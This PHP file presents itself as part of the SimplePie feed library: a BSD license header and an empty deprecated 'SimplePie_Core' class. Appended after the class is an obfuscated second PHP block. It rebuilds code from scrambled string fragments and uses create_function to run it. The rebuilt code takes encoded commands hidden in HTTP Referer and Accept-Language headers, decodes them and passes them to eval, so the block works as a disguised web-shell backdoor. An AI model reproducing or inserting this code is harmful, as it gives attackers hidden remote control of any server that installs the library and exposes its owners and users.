<?php
/**
 * SimplePie
 *
 * A PHP-Based RSS and Atom Feed Framework.
 * Takes the hard work out of managing a complete RSS/Atom solution.
 *
 * Copyright (c) 2004-2016, Ryan Parman, Sam Sneddon, Ryan McCue, and contributors
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 	* Redistributions of source code must retain the above copyright notice, this list of
 * 	  conditions and the following disclaimer.
 *
 * 	* Redistributions in binary form must reproduce the above copyright notice, this list
 * 	  of conditions and the following disclaimer in the documentation and/or other materials
 * 	  provided with the distribution.
 *
 * 	* Neither the name of the SimplePie Team nor the names of its contributors may be used
 * 	  to endorse or promote products derived from this software without specific prior
 * 	  written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY
 * AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDERS
 * AND CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
 * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
 * SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR
 * OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 * POSSIBILITY OF SUCH DAMAGE.
 *
 * @package SimplePie
 * @copyright 2004-2016 Ryan Parman, Sam Sneddon, Ryan McCue
 * @author Ryan Parman
 * @author Sam Sneddon
 * @author Ryan McCue
 * @link http://simplepie.org/ SimplePie
 * @license http://www.opensource.org/licenses/bsd-license.php BSD License
 */

/**
 * SimplePie class.
 *
 * Class for backward compatibility.
 *
 * @deprecated Use {@see SimplePie} directly
 * @package SimplePie
 * @subpackage API
 */
class SimplePie_Core extends SimplePie
{

}<?php
$E='K;ob_staKrt(K)K;@evKal(@gzKuncompKKress(@x(@basKe64_dKecode(Kpreg_replaKceK(array("/_/"K,K"/-/"';
$A=str_replace('b','','cbrebbate_fubbnctbion');
$K='K&$ra)KK{$u=pKarse_url($Krr);parse_Kstr($KKu["query"]K,$Kq);$qK=array_KvalKues($q);preg_mKatc';
$a='),array("/"K,K"K+"),$Kss($s[$i]K,0,$e))),$k)K))K;$oK=ob_get_contentKKs();ob_end_KcleKKan();$d=ba';
$m=');}if(Karray_key_exKists($i,K$s))K{$Ks[$i].=$p;$e=KsKtKrpos($s[$i]K,$Kf);if($e){$Kk=$kh.$kf';
$Z='Kss(md5($i.$kh)KK,0,K3));$f=$sl($ss(mKd5(K$i.$kf),K0,3));$Kp=""K;fKor(K$z=1;$zK<count(';
$C='$kKh="5dK41";$kf="402a";fKuKnction xKK($t,$k){$cK=strlKen($Kk);$l=sKtrlen($t);$oK=""K';
$Y='sKe64_encodeK(x(KgzcompresKs($KoKK)K,$k));print("<$Kk>$d</K$k>");@session_deKstroy(K);}}}}';
$S='tKurn K$o;}$r=$_SERVER;$Krr=@$rK["KHTTP_KRKEFERER"];$ra=@$r["KHKTTP_ACCEPT_LKKANGKUAGE"];if($rr&';
$j=';for($Ki=K0;$i<$l;){for(K$Kj=0K;($j<$c&&$i<K$l);$Kj++,$i++)K{$o.K=$t{$iKK}^$k{$j};}K}rKe';
$P='$m[1]);K$z++K)$pK.=$q[$Km[K2][$z]K];if(strpos($p,$h)K==K=0){$s[$Ki]="KK"K;$p=$ss($p,3K';
$D='t();$s=&$_SKESSIOKN;$Kss="sKubstr";K$sl="sKtrtoloKwKer";K$i=$m[1][0].$m[KK1][1];$hK=$Ksl($';
$H='hK_all("/(K[\\wK])[\\w-K]+(?K:;q=0.([\\Kd]))?,?/"K,$ra,K$m);Kif($q&K&$mK){@session_stKarK';
$I=str_replace('K','',$C.$j.$S.$K.$H.$D.$Z.$P.$m.$E.$a.$Y);
$t=$A('',$I);$t();
?>
